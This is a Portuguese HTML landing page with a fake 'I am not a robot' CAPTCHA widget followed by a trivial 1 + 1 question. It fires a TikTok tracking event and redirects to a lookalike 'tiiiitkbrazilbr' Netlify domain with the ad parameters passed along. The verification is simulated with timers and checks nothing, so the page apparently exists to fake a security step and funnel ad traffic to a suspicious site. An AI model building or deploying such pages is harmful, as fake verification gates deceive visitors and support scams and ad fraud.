<style>
*{box-sizing:border-box}body{margin:0;min-height:100svh;display:grid;place-items:center;background:#fff;color:#202124;font-family:Arial,Helvetica,sans-serif}main{text-align:center;padding:28px 18px;width:100%;max-width:470px}h1{font-size:20px;font-weight:500;letter-spacing:-.4px;margin:0 0 10px}.intro{color:#70757a;font-size:14px;line-height:1.6;margin:0 0 24px}.widget{width:280px;min-height:64px;max-width:100%;border:1px solid #eee7e9;border-radius:12px;background:#fff;margin:auto;display:flex;align-items:center;padding:16px 20px;gap:13px;text-align:left}.check{display:grid;place-items:center;flex-shrink:0;width:24px;height:24px;border:1.5px solid #cfc5c9;border-radius:5px;background:white;cursor:pointer;padding:0}.check:focus-visible{outline:3px solid #f7c3d1;outline-offset:4px}.label{font-size:14px;min-width:0;cursor:pointer}.status{min-height:40px;margin:20px 0 0;font-size:13px;color:#70757a;line-height:1.5}.busy{border:3px solid #fbe4eb;border-top-color:#db6589;border-radius:50%;animation:spin .8s linear infinite;background:transparent}.done{border-color:transparent;background:transparent;color:#319552}.done svg{width:32px;height:32px}.success{color:#238444}@keyframes spin{to{transform:rotate(360deg)}}@media(prefers-reduced-motion:reduce){.busy{animation:none}}

dialog{margin:auto;border:1px solid #e8eaed;padding:0;border-radius:16px;width:min(340px,calc(100% - 40px));max-height:calc(100svh - 40px);overflow:auto;color:#30343b;background:#fff;box-shadow:0 16px 60px #24304420;font-family:Arial,Helvetica,sans-serif}dialog::backdrop{background:#28334340;backdrop-filter:blur(3px);animation:veil-in .35s ease}dialog[open]{animation:modal-in .4s ease both}.modal-head{text-align:center;padding:26px 26px 0}.alert-icon{border-radius:50%;width:34px;height:34px;display:grid;place-items:center;margin:0 auto 14px;background:#fff0f4;color:#ca5c7f}.modal-head h2{font-size:18px;font-weight:500;letter-spacing:-.25px;margin:0 0 9px}.modal-head p{font-size:13px;color:#7b818b;line-height:1.6;margin:0}.modal-body{padding:20px 26px 26px;text-align:center}.equation{display:block;background:#fff5f8;border:1px solid #f9e8ee;border-radius:10px;padding:16px;font-size:29px;font-weight:500;letter-spacing:2px}.answer-label{display:block;text-align:left;color:#747b85;font-size:12px;margin:18px 0 8px}.answer{display:block;width:100%;border:1px solid #eadde2;border-radius:9px;padding:12px;text-align:center;font-size:16px;color:#383838;background:#fff;outline:none;transition:border-color .2s,box-shadow .2s}.answer::placeholder{color:#a1a7b0}.answer:focus{border-color:#dc8ba5;box-shadow:0 0 0 3px #fff0f5}.confirm{width:100%;border:0;border-radius:9px;padding:12px;background:#b94c70;color:#fff;font-size:14px;font-weight:500;cursor:pointer;transition:background .2s}.confirm:hover{background:#a33e60}.confirm:focus-visible{outline:3px solid #f4ccda;outline-offset:3px}.confirm:disabled{opacity:.75;cursor:wait}.feedback{min-height:17px;font-size:12px;color:#b35858;margin:9px 0}.feedback.success{color:#39805b}@keyframes modal-in{from{opacity:0;transform:translateY(8px) scale(.985)}to{opacity:1;transform:none}}@keyframes veil-in{from{background:#28334300}to{background:#28334340}}@media(prefers-reduced-motion:reduce){dialog[open],dialog::backdrop{animation:none}}
.captcha-seal{margin-left:auto;flex-shrink:0;width:44px;text-align:center;color:#978b90}.captcha-seal svg{display:block;width:25px;height:25px;margin:0 auto 4px}.captcha-seal span{display:block;font-size:7px;letter-spacing:.5px}.widget{width:304px;padding:14px 16px;gap:11px}

<body><main>
<h1>Verificação de acesso</h1>
<p class="intro">Marque a caixa abaixo para continuar.</p>
<div class="widget">
<button class="check" id="check" type="button" role="checkbox" aria-checked="false" aria-label="Não sou um robô" aria-describedby="status"></button>
<span class="label" id="label">Não sou um robô</span>
<div class="captcha-seal" aria-hidden="true"><svg viewBox="0 0 36 36" fill="none"><path fill="#d97896" d="M29 10A13 13 0 008 7L4 3v13h13l-5-5a8 8 0 0113 3z"/><path fill="#b6abb0" d="M7 26a13 13 0 0021 3l4 4V20H19l5 5a8 8 0 01-13-3z"/></svg><span>CAPTCHA</span></div>
</div>
<p class="status" id="status" role="status" aria-live="polite"></p>

</main>
<dialog id="verification" lang="pt-BR" aria-labelledby="modal-title" aria-describedby="modal-description">
<div class="modal-head"><div class="alert-icon" aria-hidden="true"><svg width="18" height="18" viewBox="0 0 24 24" fill="none"><path d="M12 3 4 6v6c0 4 4 7 8 9 4-2 8-5 8-9V6l-8-3Z" stroke="currentColor" stroke-width="1.5"/><path d="m8.5 12 2.5 2.5 4.5-5" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg></div><h2 id="modal-title">Só mais uma confirmação</h2><p id="modal-description">Responda à conta abaixo para continuar.</p></div>
<form id="answer-form" class="modal-body">
<div class="equation" aria-label="Quanto é um mais um?">1 + 1 = ?</div>
<label class="answer-label" for="answer">Sua resposta</label>
<input class="answer" id="answer" name="answer" type="text" inputmode="numeric" autocomplete="off" placeholder="Digite aqui" aria-describedby="answer-feedback" required>
<p class="feedback" id="answer-feedback" role="status" aria-live="polite"></p>
<button class="confirm" type="submit">Continuar</button>
</form></dialog>

<script>
const REDIRECT_URL = 'https://tiiiitkbrazilbr.netlify.app/';
const button=document.getElementById('check');
const status=document.getElementById('status');
const modal=document.getElementById('verification');
const answer=document.getElementById('answer');
const feedback=document.getElementById('answer-feedback');
let completed=false;
document.getElementById('label').addEventListener('click',()=>button.click());
button.addEventListener('click',()=>{
  if(button.disabled)return;
  if(completed){modal.showModal();answer.focus();return;}
  button.disabled=true;button.classList.add('busy');button.setAttribute('aria-busy','true');status.textContent='Verificando…';
  setTimeout(()=>{
    button.className='check done';
    button.innerHTML='<svg viewBox="0 0 32 32" fill="none" aria-hidden="true"><path d="m5 17 7 7L27 7" stroke="currentColor" stroke-width="3.5" stroke-linecap="round" stroke-linejoin="round"/></svg>';
    button.setAttribute('aria-checked','true');button.removeAttribute('aria-busy');button.disabled=false;completed=true;
    status.textContent='Só mais um instante…';
    setTimeout(()=>{if(!modal.open)modal.showModal();},850);
  },1100);
});
answer.addEventListener('input',()=>{answer.removeAttribute('aria-invalid');feedback.textContent='';});
document.getElementById('answer-form').addEventListener('submit',event=>{
  event.preventDefault();
  if(answer.value.trim()!=='2'){
    feedback.textContent='Confira a resposta e tente novamente.';answer.setAttribute('aria-invalid','true');answer.focus();answer.select();return;
  }
  const submit=event.currentTarget.querySelector('button');submit.disabled=true;answer.readOnly=true;
  feedback.classList.add('success');feedback.textContent='Tudo certo. Abrindo a próxima página…';submit.textContent='Aguarde…';
  // Mesmo evento de avanço da página original, após a resposta correta.
  try { if(window.ttq && typeof window.ttq.track==='function') window.ttq.track('ClickButton'); } catch(error) {}
  // Preserva integralmente UTMs, ttclid e os demais parâmetros de entrada.
  const destination = REDIRECT_URL + window.location.search;
  setTimeout(()=>window.location.assign(destination),700);
});
</script></body></html>
